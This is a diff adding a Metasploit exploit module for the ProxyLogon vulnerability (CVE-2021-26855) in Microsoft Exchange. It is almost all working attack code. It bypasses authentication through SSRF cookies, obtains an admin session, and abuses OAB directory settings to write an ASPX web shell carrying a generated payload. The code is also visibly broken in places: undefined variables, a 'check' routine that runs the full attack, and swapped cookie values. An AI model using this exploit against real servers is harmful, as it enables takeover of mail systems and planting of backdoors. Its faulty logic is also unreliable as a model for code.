@@ -1,0 +1,343 @@
+require 'openssl'
+
+class MetasploitModule < Msf::Exploit::Remote
+
+  Rank = ExcellentRanking
+ 
+  include Msf::Exploit::Remote::HttpClient
+  include Msf::Exploit::EXE
+
+  def initialize(info = {})
+    super(update_info(
+       info,
+      'Name'           => 'Proxylogon RCE',
+      'Description'    => %q{
+        ProxyLogon is the formally generic name for CVE-2021-26855, a vulnerability on Microsoft Exchange Server
+that allows an attacker bypassing the authentication and impersonating as the admin.
+      },
+      'Author'         => [
+        'Roberto Focke'],
+      'References'     => [
+        ['CVE', '2021-26855'],
+        ['URL', 'https://proxylogon.com']
+      ],"Targets" => [
+          ["Windows", {}],
+        ],
+      'DisclosureDate' => 'March 12 2021',
+      'License'        => MSF_LICENSE,
+      'Platform'       => ['windows'],
+      'Arch'           => [ARCH_X86, ARCH_X64],
+      'Privileged'     => false,
+      'DefaultOptions' => {
+          'SSL' => true
+        },
+         "DefaultTarget" => 0
+      ))    
+  register_options([
+      OptString.new('EMAIL', [true, "EMAIL"]),
+      OptString.new('RPORT', [true, 'REMOTE PORT', '443'])
+    ])
+
+  end
+
+ def check
+   js = (0...3).map { (65 + rand(26)).chr }.join+".js"
+   url=normalize_uri(target_uri.path,'ecp',js)
+   print_status(url)
+      autoDiscoverBody = "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">
+    <Request>
+      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+    </Request>
+</Autodiscover>" % datastore['EMAIL']
+
+   url=normalize_uri(target_uri.path,'ecp',js)
+
+   res=send_request_cgi(
+      'method' => 'GET',
+      'uri'     => normalize_uri(target_uri.path,'ecp',js),
+      "cookie"=> "X-BEResource=localhost~1942062522",
+      "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36")
+       
+       if res.headers["X-FEServer"]
+         fqdn = res.headers["X-FEServer"]
+         print_status(fqdn)
+       end
+         url=normalize_uri(target_uri.path,'ecp',js)
+
+      res=send_request_cgi(
+      "method" => 'POST',
+      "uri"=> url,
+      "cookie"=> "X-BEResource="+fqdn+"/autodiscover/autodiscover.xml?a=~1942062522;",
+      "ctype"=> "text/xml",
+      "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+      "data"=> autoDiscoverBody
+)
+
+
+  if res.code != 200
+     print_status("Autodiscover Error!")
+     exit()
+  end
+  if !res.body.include? "LegacyDN"
+     print_status("Can not get LegacyDN")
+     exit()
+  end
+  legacyDn = res.body.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+  print_status("Got DN: " + legacyDn)
+
+  mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
+ 
+    headers={
+      'X-Requesttype' => 'Connect',
+      'X-Requestid' => Rex::Text.rand_text_numeric(12..13).to_s,
+      'X-Clientapplication' => "Outlook/15.0.4815.1002"
+}
+   res=send_request_cgi(
+   "method" => 'POST',
+   "uri"     => url,
+   'headers'=> headers,
+   "cookie"=> "X-BEResource=Admin@"+fqdn+":444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" ,
+   "agent"=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   'ctype'=>'application/mapi-http',
+   "data"=> mapi_body
+   )
+
+  if !res.body.include? "act as owner of a UserMailbox"
+     print_status("Mapi Error!")
+     puts res
+     exit
+  end
+
+  sid = res.body.split("with SID ")[1].split(" and MasterAccountSid")[0]
+  print_status("Got SID: " + sid)
+
+
+proxyLogon_request = '<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>' % sid
+
+
+ res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+   "cookie"=> "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % fqdn,
+   "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   "data"=>proxyLogon_request
+)
+
+
+
+  if res.code != 241 or !res.headers.include? "set-cookie"
+      print_status("Proxylogon Error!")
+      exit()
+  end  
+  s=res.headers['set-cookie']
+  puts res
+  sess_id = s.split("ASP.NET_SessionId=")[1].split(";")[0]
+  msExchEcpCanary = s.split("msExchEcpCanary=")[1].split(";")[0]
+  print_status("Got session id: " + sess_id)
+  print_status("Got canary: " + msExchEcpCanary)
+
+ 
+
+   res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+   "cookie" => "X-BEResource=Admin@"+fqdn+":444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary,
+   "ctype"=> "application/json; charset=utf-8",
+   "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   "data" =>'{"filter": {
+        "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+        "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}')
+
+ 
+   if res.code != 200
+       print_status("GetOAB Error!")
+       exit
+   end
+   oabId = ct.body.split('"RawIdentity":"')[1].split('"')[0]
+   print_status("Got OAB id: " + oabId)
+   oab_json = '{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
+            "properties": {
+                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+                               "ExternalUrl": "http://ffff/#%s"'+asp+'}}}'
+
+
+ res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+    "cookie"=> "X-BEResource=Admin@"+msExchEcpCanary+":444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary="+fqdn+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary,
+    "ctype"=> "application/json; charset=utf-8",
+   'agent' =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   'data'=>oab_json)
+
+   if res.status_code != 200
+       print_status("Set external url Error!")
+       exit
+       end
+ 
+
+end
+
+
+ def exploit
+   shell_path = "Program Files\\Microsoft\\Exchange Server\\V15\\FrontEnd\\HttpProxy\\owa\\auth\\ahihi.aspx"
+   shell_absolute_path = "\\\\127.0.0.1\\c$\\%s" % shell_path
+   exe  = generate_payload_exe
+   asp  = Msf::Util::EXE.to_exe_asp(exe)
+   js = (0...3).map { (65 + rand(26)).chr }.join+".js"
+   url=normalize_uri(target_uri.path,'ecp',js)
+   print_status(url)
+      autoDiscoverBody = "<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">
+    <Request>
+      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
+    </Request>
+</Autodiscover>" % datastore['EMAIL']
+
+   url=normalize_uri(target_uri.path,'ecp',js)
+
+   res=send_request_cgi(
+      'method' => 'GET',
+      'uri'     => normalize_uri(target_uri.path,'ecp',js),
+      "cookie"=> "X-BEResource=localhost~1942062522",
+      "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36")
+       
+       if res.headers["X-FEServer"]
+         fqdn = res.headers["X-FEServer"]
+         print_status(fqdn)
+       end
+         url=normalize_uri(target_uri.path,'ecp',js)
+
+      res=send_request_cgi(
+      "method" => 'POST',
+      "uri"=> url,
+      "cookie"=> "X-BEResource="+fqdn+"/autodiscover/autodiscover.xml?a=~1942062522;",
+      "ctype"=> "text/xml",
+      "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+      "data"=> autoDiscoverBody
+)
+
+
+  if res.code != 200
+     print_status("Autodiscover Error!")
+     exit()
+  end
+  if !res.body.include? "LegacyDN"
+     print_status("Can not get LegacyDN")
+     exit()
+  end
+  legacyDn = res.body.split("<LegacyDN>")[1].split("</LegacyDN>")[0]
+  print_status("Got DN: " + legacyDn)
+
+  mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"
+ 
+    headers={
+      'X-Requesttype' => 'Connect',
+      'X-Requestid' => Rex::Text.rand_text_numeric(12..13).to_s,
+      'X-Clientapplication' => "Outlook/15.0.4815.1002"
+}
+   res=send_request_cgi(
+   "method" => 'POST',
+   "uri"     => url,
+   'headers'=> headers,
+   "cookie"=> "X-BEResource=Admin@"+fqdn+":444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;" ,
+   "agent"=>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   'ctype'=>'application/mapi-http',
+   "data"=> mapi_body
+   )
+
+  if !res.body.include? "act as owner of a UserMailbox"
+     print_status("Mapi Error!")
+     puts res
+     exit
+  end
+
+  sid = res.body.split("with SID ")[1].split(" and MasterAccountSid")[0]
+  print_status("Got SID: " + sid)
+
+
+proxyLogon_request = '<r at="Negotiate" ln="john"><s>%s</s><s a="7" t="1">S-1-1-0</s><s a="7" t="1">S-1-5-2</s><s a="7" t="1">S-1-5-11</s><s a="7" t="1">S-1-5-15</s><s a="3221225479" t="1">S-1-5-5-0-6948923</s></r>' % sid
+
+
+ res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+   "cookie"=> "X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;" % fqdn,
+   "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   "data"=>proxyLogon_request
+)
+
+
+
+  if res.code != 241 or !res.headers.include? "set-cookie"
+      print_status("Proxylogon Error!")
+      exit()
+  end  
+  s=res.headers['set-cookie']
+  puts res
+  sess_id = s.split("ASP.NET_SessionId=")[1].split(";")[0]
+  msExchEcpCanary = s.split("msExchEcpCanary=")[1].split(";")[0]
+  print_status("Got session id: " + sess_id)
+  print_status("Got canary: " + msExchEcpCanary)
+
+ 
+
+   res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+   "cookie" => "X-BEResource=Admin@"+fqdn+":444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary,
+   "ctype"=> "application/json; charset=utf-8",
+   "agent" =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   "data" =>'{"filter": {
+        "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+        "SelectedView": "", "SelectedVDirType": "All"}}, "sort": {}}')
+
+ 
+   if res.code != 200
+       print_status("GetOAB Error!")
+       exit
+   end
+   oabId = ct.body.split('"RawIdentity":"')[1].split('"')[0]
+   print_status("Got OAB id: " + oabId)
+   oab_json = '{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity": oabId},
+            "properties": {
+                "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+                               "ExternalUrl": "http://ffff/#%s"'+asp+'}}}'
+
+
+ res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+    "cookie"=> "X-BEResource=Admin@"+msExchEcpCanary+":444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary="+fqdn+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary,
+    "ctype"=> "application/json; charset=utf-8",
+   'agent' =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   'data'=>oab_json)
+
+
+
+   if res.status_code != 200
+       print_status("Set external url Error!")
+       exit
+       end
+   reset_oab_body ='{"identity": {"__type": "Identity:ECP", "DisplayName": "OAB (Default Web Site)", "RawIdentity":'+oabId+'},
+                  "properties": {
+                      "Parameters": {"__type": "JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel",
+                                     "FilePathName":'+ shell_absolute_path+'}}}'
+
+
+ res=send_request_cgi(
+   'method' => 'POST',
+   'uri'     => url,
+   "cookie"=> "X-BEResource=Admin@"+fqdn+":444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary="+msExchEcpCanary+"&a=~1942062522; ASP.NET_SessionId="+sess_id+"; msExchEcpCanary="+msExchEcpCanary,
+   "ctype"=> "application/json; charset=utf-8",
+   'agent' =>"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36",
+   'data'=>reset_oab_body)
+
+    if res.code != 200
+        print_status("Write Shell Error!")
+        exit
+    end
+    print_status("succesfull!")
+   
+   
+   
+  end
+end
